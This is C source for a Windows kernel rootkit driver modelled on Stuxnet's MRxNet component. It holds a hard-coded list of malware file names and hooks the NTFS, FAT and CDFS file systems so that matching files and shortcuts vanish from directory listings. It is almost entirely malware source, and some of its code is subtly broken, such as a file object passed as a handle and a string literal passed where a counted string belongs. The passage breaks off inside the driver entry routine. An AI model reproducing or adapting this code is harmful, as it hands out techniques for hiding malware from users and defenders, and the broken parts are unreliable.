#define UserMode                    1
#define MAX_PATH                    260

#define STUXNET_MAGIC               0x53545558
#define STUXNET_VERSION             0x00010400
#define MRXNET_DEVICE_NAME          L"\\Device\\MRxNet"
#define MRXNET_SYMLINK_NAME         L"\\DosDevices\\MRxNet"
#define MRXNET_DRIVER_NAME          L"MRxNet"
#define MRXNET_REGISTRY_PATH        L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\MRxNet"

#define MRXNET_POOL_TAG             'lnCx'

#define MRXNET_MAX_HIDDEN_FILES     32
#define MRXNET_HIDDEN_LNK_SIZE      0x104B
#define MRXNET_HIDDEN_TMP_MIN_SIZE  0x1000
#define MRXNET_HIDDEN_TMP_MAX_SIZE  0x800000

#define MRXNET_DRIVER_SIZE          17400

typedef NTSTATUS (NTAPI *PFN_NtQueryDirectoryFile)(
    HANDLE FileHandle,
    HANDLE Event,
    PVOID ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    BOOLEAN ReturnSingleEntry,
    PUNICODE_STRING FileName,
    BOOLEAN RestartScan
);

typedef NTSTATUS (NTAPI *PFN_ZwQueryDirectoryFile)(
    HANDLE FileHandle,
    HANDLE Event,
    PVOID ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    BOOLEAN ReturnSingleEntry,
    PUNICODE_STRING FileName,
    BOOLEAN RestartScan
);

typedef NTSTATUS (NTAPI *PFN_ObReferenceObjectByName)(
    PUNICODE_STRING ObjectName,
    ULONG Attributes,
    PACCESS_STATE AccessState,
    ACCESS_MASK DesiredAccess,
    POBJECT_TYPE ObjectType,
    KPROCESSOR_MODE AccessMode,
    PVOID ParseContext,
    PVOID *Object
);

typedef struct _MRXNET_DEVICE_EXTENSION {
    PDEVICE_OBJECT pDeviceObject;
    PDEVICE_OBJECT pLowerDevice;
    PDEVICE_OBJECT pRealDevice;
    BOOLEAN bInitialized;
    ULONG ulHiddenCount;
    PFN_NtQueryDirectoryFile pOriginalNtQueryDirectoryFile;
    PFN_ZwQueryDirectoryFile pOriginalZwQueryDirectoryFile;
    PFN_ObReferenceObjectByName pObReferenceObjectByName;
    KSPIN_LOCK SpinLock;
    KEVENT LoadEvent;
    KEVENT UnloadEvent;
    ULONG ulFileSystemCount;
    ULONG ulIrpCount;
    ULONG ulErrorCount;
    BYTE bReserved[256];
} MRXNET_DEVICE_EXTENSION, * PMRXNET_DEVICE_EXTENSION;

typedef struct _MRXNET_FILE_CONTEXT {
    PFILE_OBJECT pFileObject;
    PFILE_OBJECT pRelatedFileObject;
    UNICODE_STRING ustrFileName;
    BOOLEAN bIsHidden;
    BYTE bReserved[16];
} MRXNET_FILE_CONTEXT, * PMRXNET_FILE_CONTEXT;

static PMRXNET_DEVICE_EXTENSION g_pDeviceExtension = NULL;
static PDRIVER_OBJECT g_pDriverObject = NULL;

static UNICODE_STRING g_ustrNtfs = RTL_CONSTANT_STRING(L"\\FileSystem\\ntfs");
static UNICODE_STRING g_ustrFastFat = RTL_CONSTANT_STRING(L"\\FileSystem\\fastfat");
static UNICODE_STRING g_ustrCdfs = RTL_CONSTANT_STRING(L"\\FileSystem\\cdfs");

static UNICODE_STRING g_ustrHiddenFiles[MRXNET_MAX_HIDDEN_FILES];

static VOID MRxNet_InitHiddenFiles(VOID) {
    ULONG i = 0;
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"mrxcls.sys");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"mrxnet.sys");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"oem7A.PNF");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"oem6C.PNF");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"mdmcpq3.PNF");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"mdmeric3.PNF");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"~WTR4132.TMP");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"~WTR4141.TMP");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"Copy of Shortcut to.lnk");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"Copy of Copy of Shortcut to.lnk");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"Copy of Copy of Copy of Shortcut to.lnk");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"Copy of Copy of Copy of Copy of Shortcut to.lnk");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"autorun.inf");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"stuxnet.cfg");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"winsta.exe");
    RtlInitUnicodeString(&g_ustrHiddenFiles[i++], L"sysnullevnt.mof");
}

static BOOLEAN MRxNet_IsFileHidden(PUNICODE_STRING pFileName) {
    ULONG i;
    UNICODE_STRING ustrExtension;
    WCHAR wszExtension[8];
    if (!pFileName || !pFileName->Buffer || pFileName->Length == 0) {
        return FALSE;
    }
    for (i = 0; i < MRXNET_MAX_HIDDEN_FILES; i++) {
        if (RtlCompareUnicodeString(pFileName, &g_ustrHiddenFiles[i], TRUE) == 0) {
            return TRUE;
        }
    }
    if (pFileName->Length >= 4) {
        WCHAR *pExt = pFileName->Buffer + (pFileName->Length / sizeof(WCHAR)) - 4;
        if (*pExt == L'.') {
            RtlInitUnicodeString(&ustrExtension, pExt);
            if (RtlCompareUnicodeString(&ustrExtension, L".lnk", TRUE) == 0) {
                return TRUE;
            }
        }
    }
    if (pFileName->Length >= 8) {
        WCHAR *pName = pFileName->Buffer;
        if (pName[0] == L'~' && pName[1] == L'W' && pName[2] == L'T' && pName[3] == L'R') {
            if (pFileName->Length >= 12) {
                WCHAR wszPrefix[8];
                RtlZeroMemory(wszPrefix, sizeof(wszPrefix));
                RtlCopyMemory(wszPrefix, pName + 4, 8);
                DWORD dwSum = 0;
                for (int i = 0; i < 4 && wszPrefix[i] >= L'0' && wszPrefix[i] <= L'9'; i++) {
                    dwSum += (wszPrefix[i] - L'0');
                }
                if (dwSum % 10 == 0) {
                    return TRUE;
                }
            }
        }
    }
    return FALSE;
}

static BOOLEAN MRxNet_IsFileHiddenByAttributes(PFILE_DIRECTORY_INFORMATION pDirInfo) {
    UNICODE_STRING ustrFileName;
    if (!pDirInfo) return FALSE;
    ustrFileName.Buffer = pDirInfo->FileName;
    ustrFileName.Length = (USHORT)pDirInfo->FileNameLength;
    ustrFileName.MaximumLength = (USHORT)pDirInfo->FileNameLength;
    if (MRxNet_IsFileHidden(&ustrFileName)) {
        return TRUE;
    }
    if (pDirInfo->FileNameLength >= 4) {
        WCHAR *pExt = pDirInfo->FileName + (pDirInfo->FileNameLength / sizeof(WCHAR)) - 4;
        if (*pExt == L'.') {
            UNICODE_STRING ustrExt;
            RtlInitUnicodeString(&ustrExt, pExt);
            if (RtlCompareUnicodeString(&ustrExt, L".lnk", TRUE) == 0) {
                if (pDirInfo->EndOfFile.LowPart == MRXNET_HIDDEN_LNK_SIZE) {
                    return TRUE;
                }
            }
        }
    }
    if (pDirInfo->FileNameLength >= 8) {
        WCHAR *pName = pDirInfo->FileName;
        if (pName[0] == L'~' && pName[1] == L'W' && pName[2] == L'T' && pName[3] == L'R') {
            if (pDirInfo->FileNameLength >= 12) {
                WCHAR wszPrefix[8];
                RtlZeroMemory(wszPrefix, sizeof(wszPrefix));
                RtlCopyMemory(wszPrefix, pName + 4, 8);
                DWORD dwSum = 0;
                for (int i = 0; i < 4 && wszPrefix[i] >= L'0' && wszPrefix[i] <= L'9'; i++) {
                    dwSum += (wszPrefix[i] - L'0');
                }
                if (dwSum % 10 == 0) {
                    if (pDirInfo->EndOfFile.LowPart >= MRXNET_HIDDEN_TMP_MIN_SIZE &&
                        pDirInfo->EndOfFile.LowPart <= MRXNET_HIDDEN_TMP_MAX_SIZE) {
                        return TRUE;
                    }
                }
            }
        }
    }
    return FALSE;
}

static NTSTATUS MRxNet_FilterDirectoryEntries(
    PVOID pFileInfo,
    ULONG Length,
    FILE_INFORMATION_CLASS InfoClass,
    PULONG pReturnLength
) {
    PFILE_DIRECTORY_INFORMATION pCurrent;
    PFILE_DIRECTORY_INFORMATION pPrev;
    PFILE_DIRECTORY_INFORMATION pNext;
    ULONG ulEntrySize;
    ULONG ulRemaining;
    ULONG ulNewLength;
    BOOLEAN bFound;
    if (!pFileInfo || Length == 0 || !pReturnLength) {
        return STATUS_INVALID_PARAMETER;
    }
    if (InfoClass != FileDirectoryInformation && InfoClass != FileBothDirectoryInformation) {
        return STATUS_SUCCESS;
    }
    pCurrent = (PFILE_DIRECTORY_INFORMATION)pFileInfo;
    pPrev = NULL;
    ulRemaining = *pReturnLength;
    ulNewLength = 0;
    bFound = FALSE;
    while (ulRemaining >= sizeof(FILE_DIRECTORY_INFORMATION)) {
        ulEntrySize = pCurrent->NextEntryOffset ? pCurrent->NextEntryOffset : ulRemaining;
        if (MRxNet_IsFileHiddenByAttributes(pCurrent)) {
            bFound = TRUE;
            if (pCurrent->NextEntryOffset != 0) {
                pNext = (PFILE_DIRECTORY_INFORMATION)((PBYTE)pCurrent + pCurrent->NextEntryOffset);
                if (pPrev == NULL) {
                    RtlCopyMemory(pCurrent, pNext, ulRemaining - pCurrent->NextEntryOffset);
                    pCurrent = (PFILE_DIRECTORY_INFORMATION)pFileInfo;
                    ulRemaining -= pCurrent->NextEntryOffset;
                    continue;
                } else {
                    pPrev->NextEntryOffset += pCurrent->NextEntryOffset;
                    pCurrent = pNext;
                    ulRemaining -= ulEntrySize;
                    continue;
                }
            } else {
                if (pPrev != NULL) {
                    pPrev->NextEntryOffset = 0;
                }
                ulRemaining = 0;
                break;
            }
        }
        ulNewLength += ulEntrySize;
        pPrev = pCurrent;
        pCurrent = (PFILE_DIRECTORY_INFORMATION)((PBYTE)pCurrent + ulEntrySize);
        ulRemaining -= ulEntrySize;
    }
    if (bFound) {
        *pReturnLength = ulNewLength;
    }
    return STATUS_SUCCESS;
}

static NTSTATUS MRxNet_DirControl(
    PDEVICE_OBJECT pDeviceObject,
    PIRP pIrp
) {
    PIO_STACK_LOCATION pStack;
    NTSTATUS status;
    PVOID pFileInfo;
    ULONG ulLength;
    FILE_INFORMATION_CLASS InfoClass;
    PULONG pReturnLength;
    if (!pDeviceObject || !pIrp) {
        return STATUS_INVALID_PARAMETER;
    }
    if (!g_pDeviceExtension || !g_pDeviceExtension->pLowerDevice) {
        pIrp->IoStatus.Status = STATUS_UNSUCCESSFUL;
        IoCompleteRequest(pIrp, IO_NO_INCREMENT);
        return STATUS_UNSUCCESSFUL;
    }
    pStack = IoGetCurrentIrpStackLocation(pIrp);
    if (!pStack) {
        pIrp->IoStatus.Status = STATUS_INVALID_PARAMETER;
        IoCompleteRequest(pIrp, IO_NO_INCREMENT);
        return STATUS_INVALID_PARAMETER;
    }
    if (pStack->MajorFunction != IRP_MJ_DIRECTORY_CONTROL) {
        IoSkipCurrentIrpStackLocation(pIrp);
        return IoCallDriver(g_pDeviceExtension->pLowerDevice, pIrp);
    }
    IoCopyCurrentIrpStackLocationToNext(pIrp);
    status = IoCallDriver(g_pDeviceExtension->pLowerDevice, pIrp);
    if (!NT_SUCCESS(status)) {
        return status;
    }
    if (pStack->Parameters.DirectoryControl.QueryDirectory.FileInformationClass == FileDirectoryInformation ||
        pStack->Parameters.DirectoryControl.QueryDirectory.FileInformationClass == FileBothDirectoryInformation) {
        pFileInfo = pIrp->AssociatedIrp.SystemBuffer;
        ulLength = pIrp->IoStatus.Information;
        InfoClass = pStack->Parameters.DirectoryControl.QueryDirectory.FileInformationClass;
        pReturnLength = &pIrp->IoStatus.Information;
        MRxNet_FilterDirectoryEntries(pFileInfo, ulLength, InfoClass, pReturnLength);
    }
    if (g_pDeviceExtension) {
        g_pDeviceExtension->ulIrpCount++;
    }
    return status;
}

static NTSTATUS MRxNet_FileSystemControl(
    PDEVICE_OBJECT pDeviceObject,
    PIRP pIrp
) {
    if (!pDeviceObject || !pIrp) {
        return STATUS_INVALID_PARAMETER;
    }
    if (!g_pDeviceExtension || !g_pDeviceExtension->pLowerDevice) {
        pIrp->IoStatus.Status = STATUS_UNSUCCESSFUL;
        IoCompleteRequest(pIrp, IO_NO_INCREMENT);
        return STATUS_UNSUCCESSFUL;
    }
    IoSkipCurrentIrpStackLocation(pIrp);
    return IoCallDriver(g_pDeviceExtension->pLowerDevice, pIrp);
}

static NTSTATUS MRxNet_DispatchPassThrough(
    PDEVICE_OBJECT pDeviceObject,
    PIRP pIrp
) {
    if (!pDeviceObject || !pIrp) {
        return STATUS_INVALID_PARAMETER;
    }
    if (!g_pDeviceExtension || !g_pDeviceExtension->pLowerDevice) {
        pIrp->IoStatus.Status = STATUS_UNSUCCESSFUL;
        IoCompleteRequest(pIrp, IO_NO_INCREMENT);
        return STATUS_UNSUCCESSFUL;
    }
    IoSkipCurrentIrpStackLocation(pIrp);
    return IoCallDriver(g_pDeviceExtension->pLowerDevice, pIrp);
}

static NTSTATUS MRxNet_DispatchCreate(
    PDEVICE_OBJECT pDeviceObject,
    PIRP pIrp
) {
    if (!pIrp) return STATUS_INVALID_PARAMETER;
    pIrp->IoStatus.Status = STATUS_SUCCESS;
    pIrp->IoStatus.Information = 0;
    IoCompleteRequest(pIrp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

static NTSTATUS MRxNet_DispatchClose(
    PDEVICE_OBJECT pDeviceObject,
    PIRP pIrp
) {
    if (!pIrp) return STATUS_INVALID_PARAMETER;
    pIrp->IoStatus.Status = STATUS_SUCCESS;
    pIrp->IoStatus.Information = 0;
    IoCompleteRequest(pIrp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

static BOOLEAN MRxNet_FastIoCheckIfPossible(
    PFILE_OBJECT pFileObject,
    PLARGE_INTEGER pFileOffset,
    ULONG Length,
    BOOLEAN Wait,
    BOOLEAN CheckForReadOperation,
    PIO_STATUS_BLOCK pIoStatus,
    PDEVICE_OBJECT pDeviceObject
) {
    if (!g_pDeviceExtension || !g_pDeviceExtension->pLowerDevice) {
        return FALSE;
    }
    return FALSE;
}

static BOOLEAN MRxNet_FastIoRead(
    PFILE_OBJECT pFileObject,
    PLARGE_INTEGER pFileOffset,
    ULONG Length,
    BOOLEAN Wait,
    ULONG LockKey,
    PVOID Buffer,
    PIO_STATUS_BLOCK pIoStatus,
    PDEVICE_OBJECT pDeviceObject
) {
    if (!g_pDeviceExtension || !g_pDeviceExtension->pLowerDevice) {
        return FALSE;
    }
    return FALSE;
}

static BOOLEAN MRxNet_FastIoWrite(
    PFILE_OBJECT pFileObject,
    PLARGE_INTEGER pFileOffset,
    ULONG Length,
    BOOLEAN Wait,
    ULONG LockKey,
    PVOID Buffer,
    PIO_STATUS_BLOCK pIoStatus,
    PDEVICE_OBJECT pDeviceObject
) {
    if (!g_pDeviceExtension || !g_pDeviceExtension->pLowerDevice) {
        return FALSE;
    }
    return FALSE;
}

static BOOLEAN MRxNet_FastIoQueryBasicInfo(
    PFILE_OBJECT pFileObject,
    BOOLEAN Wait,
    PFILE_BASIC_INFORMATION pBuffer,
    PIO_STATUS_BLOCK pIoStatus,
    PDEVICE_OBJECT pDeviceObject
) {
    if (!g_pDeviceExtension || !g_pDeviceExtension->pLowerDevice) {
        return FALSE;
    }
    return FALSE;
}

static BOOLEAN MRxNet_FastIoQueryStandardInfo(
    PFILE_OBJECT pFileObject,
    BOOLEAN Wait,
    PFILE_STANDARD_INFORMATION pBuffer,
    PIO_STATUS_BLOCK pIoStatus,
    PDEVICE_OBJECT pDeviceObject
) {
    if (!g_pDeviceExtension || !g_pDeviceExtension->pLowerDevice) {
        return FALSE;
    }
    return FALSE;
}

static BOOLEAN MRxNet_FastIoLock(
    PFILE_OBJECT pFileObject,
    PLARGE_INTEGER pFileOffset,
    PLARGE_INTEGER pLength,
    PEPROCESS pProcess,
    ULONG Key,
    BOOLEAN FailImmediately,
    BOOLEAN ExclusiveLock,
    PIO_STATUS_BLOCK pIoStatus,
    PDEVICE_OBJECT pDeviceObject
) {
    if (!g_pDeviceExtension || !g_pDeviceExtension->pLowerDevice) {
        return FALSE;
    }
    return FALSE;
}

static BOOLEAN MRxNet_FastIoUnlockSingle(
    PFILE_OBJECT pFileObject,
    PLARGE_INTEGER pFileOffset,
    PLARGE_INTEGER pLength,
    PEPROCESS pProcess,
    ULONG Key,
    PIO_STATUS_BLOCK pIoStatus,
    PDEVICE_OBJECT pDeviceObject
) {
    if (!g_pDeviceExtension || !g_pDeviceExtension->pLowerDevice) {
        return FALSE;
    }
    return FALSE;
}

static BOOLEAN MRxNet_FastIoUnlockAll(
    PFILE_OBJECT pFileObject,
    PEPROCESS pProcess,
    PIO_STATUS_BLOCK pIoStatus,
    PDEVICE_OBJECT pDeviceObject
) {
    if (!g_pDeviceExtension || !g_pDeviceExtension->pLowerDevice) {
        return FALSE;
    }
    return FALSE;
}

static BOOLEAN MRxNet_FastIoUnlockAllByKey(
    PFILE_OBJECT pFileObject,
    PVOID pProcess,
    ULONG Key,
    PIO_STATUS_BLOCK pIoStatus,
    PDEVICE_OBJECT pDeviceObject
) {
    if (!g_pDeviceExtension || !g_pDeviceExtension->pLowerDevice) {
        return FALSE;
    }
    return FALSE;
}

static BOOLEAN MRxNet_FastIoDeviceControl(
    PFILE_OBJECT pFileObject,
    BOOLEAN Wait,
    PVOID pInputBuffer,
    ULONG InputBufferLength,
    ULONG IoControlCode,
    PVOID pOutputBuffer,
    ULONG OutputBufferLength,
    ULONG *pBytesReturned,
    PIO_STATUS_BLOCK pIoStatus,
    PDEVICE_OBJECT pDeviceObject
) {
    if (!g_pDeviceExtension || !g_pDeviceExtension->pLowerDevice) {
        return FALSE;
    }
    return FALSE;
}

static BOOLEAN MRxNet_FastIoDetachDevice(
    PDEVICE_OBJECT pSourceDevice,
    PDEVICE_OBJECT pTargetDevice
) {
    if (!g_pDeviceExtension || !g_pDeviceExtension->pLowerDevice) {
        return FALSE;
    }
    return FALSE;
}

static BOOLEAN MRxNet_FastIoQueryNetworkOpenInfo(
    PFILE_OBJECT pFileObject,
    BOOLEAN Wait,
    PFILE_NETWORK_OPEN_INFORMATION pBuffer,
    PIO_STATUS_BLOCK pIoStatus,
    PDEVICE_OBJECT pDeviceObject
) {
    if (!g_pDeviceExtension || !g_pDeviceExtension->pLowerDevice) {
        return FALSE;
    }
    return FALSE;
}

static BOOLEAN MRxNet_MdlRead(
    PFILE_OBJECT pFileObject,
    PLARGE_INTEGER pFileOffset,
    ULONG Length,
    ULONG LockKey,
    PMDL pMdl,
    PIO_STATUS_BLOCK pIoStatus,
    PDEVICE_OBJECT pDeviceObject
) {
    if (!g_pDeviceExtension || !g_pDeviceExtension->pLowerDevice) {
        return FALSE;
    }
    return FALSE;
}

static BOOLEAN MRxNet_MdlReadComplete(
    PFILE_OBJECT pFileObject,
    PMDL pMdl,
    PDEVICE_OBJECT pDeviceObject
) {
    if (!g_pDeviceExtension || !g_pDeviceExtension->pLowerDevice) {
        return FALSE;
    }
    return FALSE;
}

static BOOLEAN MRxNet_PrepareMdlWrite(
    PFILE_OBJECT pFileObject,
    PLARGE_INTEGER pFileOffset,
    ULONG Length,
    ULONG LockKey,
    PMDL *ppMdl,
    PIO_STATUS_BLOCK pIoStatus,
    PDEVICE_OBJECT pDeviceObject
) {
    if (!g_pDeviceExtension || !g_pDeviceExtension->pLowerDevice) {
        return FALSE;
    }
    return FALSE;
}

static BOOLEAN MRxNet_MdlWriteComplete(
    PFILE_OBJECT pFileObject,
    PLARGE_INTEGER pFileOffset,
    PMDL pMdl,
    PDEVICE_OBJECT pDeviceObject
) {
    if (!g_pDeviceExtension || !g_pDeviceExtension->pLowerDevice) {
        return FALSE;
    }
    return FALSE;
}

static BOOLEAN MRxNet_FastIoReadCompressed(
    PFILE_OBJECT pFileObject,
    PLARGE_INTEGER pFileOffset,
    ULONG Length,
    ULONG LockKey,
    PVOID Buffer,
    PMDL pMdl,
    PIO_STATUS_BLOCK pIoStatus,
    PDEVICE_OBJECT pDeviceObject
) {
    if (!g_pDeviceExtension || !g_pDeviceExtension->pLowerDevice) {
        return FALSE;
    }
    return FALSE;
}

static BOOLEAN MRxNet_FastIoWriteCompressed(
    PFILE_OBJECT pFileObject,
    PLARGE_INTEGER pFileOffset,
    ULONG Length,
    ULONG LockKey,
    PVOID Buffer,
    PMDL pMdl,
    PIO_STATUS_BLOCK pIoStatus,
    PDEVICE_OBJECT pDeviceObject
) {
    if (!g_pDeviceExtension || !g_pDeviceExtension->pLowerDevice) {
        return FALSE;
    }
    return FALSE;
}

static BOOLEAN MRxNet_MdlReadCompleteCompressed(
    PFILE_OBJECT pFileObject,
    PMDL pMdl,
    PDEVICE_OBJECT pDeviceObject
) {
    if (!g_pDeviceExtension || !g_pDeviceExtension->pLowerDevice) {
        return FALSE;
    }
    return FALSE;
}

static BOOLEAN MRxNet_MdlWriteCompleteCompressed(
    PFILE_OBJECT pFileObject,
    PLARGE_INTEGER pFileOffset,
    PMDL pMdl,
    PDEVICE_OBJECT pDeviceObject
) {
    if (!g_pDeviceExtension || !g_pDeviceExtension->pLowerDevice) {
        return FALSE;
    }
    return FALSE;
}

static BOOLEAN MRxNet_FastIoQueryOpen(
    PFILE_OBJECT pFileObject,
    BOOLEAN Wait,
    PFILE_NETWORK_OPEN_INFORMATION pBuffer,
    PIO_STATUS_BLOCK pIoStatus,
    PDEVICE_OBJECT pDeviceObject
) {
    if (!g_pDeviceExtension || !g_pDeviceExtension->pLowerDevice) {
        return FALSE;
    }
    return FALSE;
}

static NTSTATUS MRxNet_AttachToFileSystem(PUNICODE_STRING pFileSystemName) {
    NTSTATUS status;
    PFILE_OBJECT pFileObject;
    PDEVICE_OBJECT pDeviceObject;
    PDEVICE_OBJECT pLowerDevice;
    PDEVICE_OBJECT pAttachedDevice;
    OBJECT_ATTRIBUTES objAttr;
    IO_STATUS_BLOCK ioStatus;
    if (!pFileSystemName) {
        return STATUS_INVALID_PARAMETER;
    }
    InitializeObjectAttributes(&objAttr, pFileSystemName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
    status = ZwCreateFile(
        &pFileObject,
        FILE_READ_DATA | FILE_WRITE_DATA | SYNCHRONIZE,
        &objAttr,
        &ioStatus,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0
    );
    if (!NT_SUCCESS(status)) {
        return status;
    }
    status = ObReferenceObjectByHandle(
        pFileObject,
        FILE_READ_DATA | FILE_WRITE_DATA,
        *IoFileObjectType,
        KernelMode,
        (PVOID*)&pFileObject,
        NULL
    );
    if (!NT_SUCCESS(status)) {
        ZwClose(pFileObject);
        return status;
    }
    pDeviceObject = IoGetRelatedDeviceObject(pFileObject);
    if (!pDeviceObject) {
        ObDereferenceObject(pFileObject);
        ZwClose(pFileObject);
        return STATUS_UNSUCCESSFUL;
    }
    pLowerDevice = IoAttachDeviceToDeviceStack(pDeviceObject, g_pDeviceExtension->pDeviceObject);
    if (!pLowerDevice) {
        ObDereferenceObject(pFileObject);
        ZwClose(pFileObject);
        return STATUS_UNSUCCESSFUL;
    }
    if (!g_pDeviceExtension->pLowerDevice) {
        g_pDeviceExtension->pLowerDevice = pLowerDevice;
    }
    g_pDeviceExtension->pRealDevice = pDeviceObject;
    g_pDeviceExtension->ulFileSystemCount++;
    ObDereferenceObject(pFileObject);
    ZwClose(pFileObject);
    return STATUS_SUCCESS;
}

static NTSTATUS MRxNet_AttachToAllFileSystems(VOID) {
    NTSTATUS status;
    status = MRxNet_AttachToFileSystem(&g_ustrNtfs);
    if (!NT_SUCCESS(status)) {
        return status;
    }
    status = MRxNet_AttachToFileSystem(&g_ustrFastFat);
    if (!NT_SUCCESS(status)) {
        return status;
    }
    status = MRxNet_AttachToFileSystem(&g_ustrCdfs);
    if (!NT_SUCCESS(status)) {
        return status;
    }
    return STATUS_SUCCESS;
}

static VOID MRxNet_FillFastIoRoutines(PFAST_IO_DISPATCH pFastIoDispatch) {
    if (!pFastIoDispatch) return;
    pFastIoDispatch->FastIoCheckIfPossible = MRxNet_FastIoCheckIfPossible;
    pFastIoDispatch->FastIoRead = MRxNet_FastIoRead;
    pFastIoDispatch->FastIoWrite = MRxNet_FastIoWrite;
    pFastIoDispatch->FastIoQueryBasicInfo = MRxNet_FastIoQueryBasicInfo;
    pFastIoDispatch->FastIoQueryStandardInfo = MRxNet_FastIoQueryStandardInfo;
    pFastIoDispatch->FastIoLock = MRxNet_FastIoLock;
    pFastIoDispatch->FastIoUnlockSingle = MRxNet_FastIoUnlockSingle;
    pFastIoDispatch->FastIoUnlockAll = MRxNet_FastIoUnlockAll;
    pFastIoDispatch->FastIoUnlockAllByKey = MRxNet_FastIoUnlockAllByKey;
    pFastIoDispatch->FastIoDeviceControl = MRxNet_FastIoDeviceControl;
    pFastIoDispatch->FastIoDetachDevice = MRxNet_FastIoDetachDevice;
    pFastIoDispatch->FastIoQueryNetworkOpenInfo = MRxNet_FastIoQueryNetworkOpenInfo;
    pFastIoDispatch->MdlRead = MRxNet_MdlRead;
    pFastIoDispatch->MdlReadComplete = MRxNet_MdlReadComplete;
    pFastIoDispatch->PrepareMdlWrite = MRxNet_PrepareMdlWrite;
    pFastIoDispatch->MdlWriteComplete = MRxNet_MdlWriteComplete;
    pFastIoDispatch->FastIoReadCompressed = MRxNet_FastIoReadCompressed;
    pFastIoDispatch->FastIoWriteCompressed = MRxNet_FastIoWriteCompressed;
    pFastIoDispatch->MdlReadCompleteCompressed = MRxNet_MdlReadCompleteCompressed;
    pFastIoDispatch->MdlWriteCompleteCompressed = MRxNet_MdlWriteCompleteCompressed;
    pFastIoDispatch->FastIoQueryOpen = MRxNet_FastIoQueryOpen;
}

static NTSTATUS MRxNet_CreateDevice(
    PDRIVER_OBJECT pDriverObject,
    PMRXNET_DEVICE_EXTENSION pDeviceExtension
) {
    NTSTATUS status;
    UNICODE_STRING ustrDeviceName;
    UNICODE_STRING ustrSymbolicName;
    PDEVICE_OBJECT pDeviceObject;
    if (!pDriverObject || !pDeviceExtension) {
        return STATUS_INVALID_PARAMETER;
    }
    RtlInitUnicodeString(&ustrDeviceName, MRXNET_DEVICE_NAME);
    RtlInitUnicodeString(&ustrSymbolicName, MRXNET_SYMLINK_NAME);
    status = IoCreateDevice(
        pDriverObject,
        sizeof(MRXNET_DEVICE_EXTENSION),
        &ustrDeviceName,
        FILE_DEVICE_DISK_FILE_SYSTEM,
        FILE_DEVICE_SECURE_OPEN,
        FALSE,
        &pDeviceObject
    );
    if (!NT_SUCCESS(status)) {
        return status;
    }
    pDeviceObject->Flags |= DO_BUFFERED_IO;
    pDeviceObject->Flags &= ~DO_DEVICE_INITIALIZING;
    status = IoCreateSymbolicLink(&ustrSymbolicName, &ustrDeviceName);
    if (!NT_SUCCESS(status)) {
        IoDeleteDevice(pDeviceObject);
        return status;
    }
    pDeviceExtension->pDeviceObject = pDeviceObject;
    pDeviceExtension->bInitialized = TRUE;
    return STATUS_SUCCESS;
}

static VOID MRxNet_DeleteDevice(
    PDRIVER_OBJECT pDriverObject
) {
    UNICODE_STRING ustrSymbolicName;
    if (!pDriverObject) return;
    RtlInitUnicodeString(&ustrSymbolicName, MRXNET_SYMLINK_NAME);
    IoDeleteSymbolicLink(&ustrSymbolicName);
    if (pDriverObject->DeviceObject) {
        IoDeleteDevice(pDriverObject->DeviceObject);
    }
}

static VOID MRxNet_Unload(
    PDRIVER_OBJECT pDriverObject
) {
    if (!pDriverObject) return;
    if (g_pDeviceExtension) {
        KeSetEvent(&g_pDeviceExtension->UnloadEvent, IO_NO_INCREMENT, FALSE);
    }
    MRxNet_DeleteDevice(pDriverObject);
    if (g_pDeviceExtension) {
        ExFreePoolWithTag(g_pDeviceExtension, MRXNET_POOL_TAG);
        g_pDeviceExtension = NULL;
    }
    g_pDriverObject = NULL;
}

static NTSTATUS MRxNet_DriverEntry(
    PDRIVER_OBJECT pDriverObject,
    PUNICODE_STRING pRegistryPath
) {
    NTSTATUS status;
    ULONG i;
    PFAST_IO_DISPATCH pFastIoDispatch;
    if (!pDriverObject || !pRegistryPath) {
        return STATUS_INVALID_PARAMETER;
    }
    g_pDriverObject = pDriverObject;
    g_pDeviceExtension = (PMRXNET_DEVICE_EXTENSION)ExAllocatePoolWithTag(
        NonPagedPool,
        sizeof(MRXNET_DEVICE_EXTENSION),
        MRXNET_POOL_TAG
    );
    if (!g_pDeviceExtension) {
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    RtlZeroMemory(g_pDeviceExtension, sizeof(MRXNET_DEVICE_EXTENSION));
    status = MRxNet_CreateDevice(pDriverObject, g_pDeviceExtension);
    if (!NT_SUCCESS(status)) {
        ExFreePoolWithTag(g_pDeviceExtension, MRXNET_POOL_TAG);
        g_pDeviceExtension = NULL;
        return status;
    }
    KeInitializeSpinLock(&g_pDeviceExtension->SpinLock);
    KeInitializeEvent(&g_pDeviceExtension->LoadEvent, NotificationEvent, FALSE);
    KeInitializeEvent(&g_pDeviceExtension->UnloadEvent, NotificationEvent, FALSE);
    MRxNet_InitHiddenFiles();
    for (i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++) {
        pDriverObject->MajorFunction[i] = MRxNet_DispatchPassThrough;
    }
    pDriverObject->MajorFunction[IRP_MJ_CREATE] = MRxNet_DispatchCreate;
